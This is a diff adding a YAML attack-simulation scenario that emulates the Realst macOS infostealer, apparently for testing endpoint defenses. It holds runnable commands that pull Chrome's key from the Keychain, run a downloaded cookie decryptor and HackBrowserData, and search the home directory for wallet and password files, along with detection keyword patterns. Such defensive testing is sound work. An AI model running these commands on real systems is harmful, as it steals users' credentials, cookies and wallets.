@@ -1,0 +1,348 @@
+campaign:
+    name: Realst Infostealer Campaign
+    description: The Realst Infostealer is disseminated through deceptive websites promoting counterfeit blockchain games like Brawl Earth, WildWorld, Dawnland, Destruction, and Evolion. Its primary function is to gain access to and extract browser data, cryptocurrency wallets, and keychain databases. It specifically targets browsers such as Firefox, Chrome, Opera, Brave, and Vivaldi. Additionally, the infostealer endeavors to retrieve passwords from the Keychain.
+    module: macOS Endpoint Scenario
+    severity: High
+    affected_os:
+        - macOS
+    result_condition:
+        true: unblocked
+        false: blocked
+        condition:
+            Terms:
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-1%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-2%'
+                  Operator: eq
+                - Right:
+                    Value: unblocked
+                  Left:
+                    Value: '%objective-3%'
+                  Operator: eq
+            Operator: and
+    objectives:
+        - type: Discovery
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-5%'
+                      Operator: eq
+                Operator: and
+          actions:
+            - name: Display the CPU Information Using "sysctl" Command
+              description: In this action, an attacker is trying to get CPU Information.
+              tactic: TA0007
+              technique: T1497
+              sub_technique: T1497.001
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Discovery
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: sysctl -a | grep machdep.cpu
+              keyword_queries:
+                - (("sysctl" AND "machdep.cpu" AND "grep") AND NOT (("rm" AND " -rf") OR "com.apple.quarantine" OR "PICUS_REWIND"))
+            - name: Display the Current User Name Using "whoami" Command
+              description: In this action, an attacker is trying to determine which user rights they have access to.
+              tactic: TA0007
+              technique: T1033
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Discovery
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - path: /usr/bin/whoami
+              keyword_queries:
+                - ("/usr/bin/whoami ")
+            - name: Discover Operating System Version via sw_vers
+              description: In this action, the attacker enumerates the operating system information via the sw_vers tool.
+              tactic: TA0007
+              technique: T1082
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Discovery
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - arguments: /usr/bin/sw_vers
+              keyword_queries:
+                - ("/usr/bin/sw_vers ")
+            - name: Display a List of Applications and Services Using "ps" Command
+              description: In this action, an attacker is trying to list all running processes and services, their Process IDs, their current status, and any information such as which user they are running with.
+              tactic: TA0007
+              technique: T1057
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Discovery
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - path: /bin/ps
+                  arguments: aux
+              keyword_queries:
+                - ("/bin/ps" AND "aux")
+            - name: Discover Browser Bookmarks via HackBrowserData Tool
+              description: In this action, an attacker is trying to find saved bookmarks of installed browsers on the target machine via the HackBrowserData tool.
+              tactic: TA0007
+              technique: T1217
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Discovery
+              category: Attack Scenario
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                    Operator: and
+              play_processes:
+                - path: /tmp/hack-browser-data
+                  arguments: -b all
+                  remote_files:
+                    - file: files/aGFjay1icm93c2VyLWRhdGFfX181YzNlZTFlYi03YTI5LTRiOTMtYjdkZS1mYjQ4ODZjMTMwNTE=
+                      path: /tmp/hack-browser-data
+                      is_executable: true
+                      is_downloaded: true
+                  success_conditions:
+                    - output: bookmark.csv success
+              rewind_processes:
+                - arguments: rm -rf /tmp/hack-browser-data
+                - arguments: rm -rf /tmp/results
+              keyword_queries:
+                - (("hack-browser-data" OR "8646b6c008282fb5172d07b90d12485f172ffadc" OR "6ef29251542fb151866cab2bd940f11f35ee574c63261c04c2c55b1374542a76" OR "a2d4f5633733c7b856922413616db377") AND NOT (("rm" AND " -rf") OR "com.apple.quarantine" OR "PICUS_REWIND"))
+        - type: Credential Access
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: and
+          actions:
+            - name: Decrypt Google Chrome Cookies
+              description: In this action, an attacker is trying to dump saved Google Chrome cookies.
+              tactic: TA0006
+              technique: T1539
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Credential Access
+              category: Attack Scenario
+              is_applicable_to_all_platforms: true
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-2%'
+                          Operator: eq
+                    Operator: and
+              is_privileged: true
+              play_processes:
+                - arguments: security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}' | tr -d '"' > /tmp/key.txt
+                - arguments: /tmp/chrome_decryptor < /tmp/key.txt
+                  remote_files:
+                    - file: files/Y2hyb21lX2RlY3J5cHRvcl9fXzNkMTIwYjNlLWU2NjAtNGVkYy1iODk4LWFkYjRhNTlkYTEwYQ==
+                      path: /tmp/chrome_decryptor
+                      is_executable: true
+                      is_downloaded: true
+                  success_conditions:
+                    - output: decrypt success
+              rewind_processes:
+                - arguments: rm -rf /tmp/chrome_decryptor /tmp/key.txt
+              keyword_queries:
+                - (( ("find-generic-password") OR ((("chrome_decryptor" OR "chrome_decryptor___3d120b3e-e660-4edc-b898-adb4a59da10a")) OR ("a814a169670f6fb8a5468dca9ea78b2b94b60aff57af29a269bb68f8c9858fb3" OR "be1e056f09322c11b9fe347a687f2e9aa48cfa8e" OR "664ae3635404f0b16108a17bca913d2c")) ) AND NOT (("rm" AND "-rf") OR "com.apple.quarantine" OR "PICUS_REWIND"))
+        - type: Collection
+          result_condition:
+            true: unblocked
+            false: blocked
+            condition:
+                Terms:
+                    - Right:
+                        Value: unblocked
+                      Left:
+                        Value: '%action-1%'
+                      Operator: eq
+                Operator: and
+          actions:
+            - name: Gather Credentials (Cryptocurrency Wallets) using Find Command
+              description: In this action, the find command retrieves files whose names contain "password", "wallet", "crypt", and "key" words.
+              tactic: TA0009
+              technique: T1005
+              affected_os:
+                - macOS
+              affected_platforms:
+                - name: MacOS 26 Tahoe
+                  architecture: 64-bit
+                - name: MacOS 14 Sonoma
+                  architecture: 64-bit
+                - name: MacOS 13 Ventura
+                  architecture: 64-bit
+                - name: MacOS 15 Sequoia
+                  architecture: 64-bit
+                - name: MacOS 12 Monterey
+                  architecture: 64-bit
+              is_atomic: true
+              ukc_phase: Collection
+              category: Attack Scenario
+              result_condition:
+                true: unblocked
+                false: blocked
+                condition:
+                    Terms:
+                        - Right:
+                            Value: unblocked
+                          Left:
+                            Value: '%process-1%'
+                          Operator: eq
+                    Operator: and
+              is_privileged: true
+              play_processes:
+                - arguments: find ~ -type f \( -iname '*wallet*' -o -iname '*password*' -o -iname '*crypt*' -o -iname '*key*' \)
+              keyword_queries:
+                - ("find" AND "type" AND "iname" AND "wallet" AND "password" AND "crypt" AND "key" AND NOT (("rm" AND " -rf") OR "com.apple.quarantine" OR "PICUS_REWIND"))
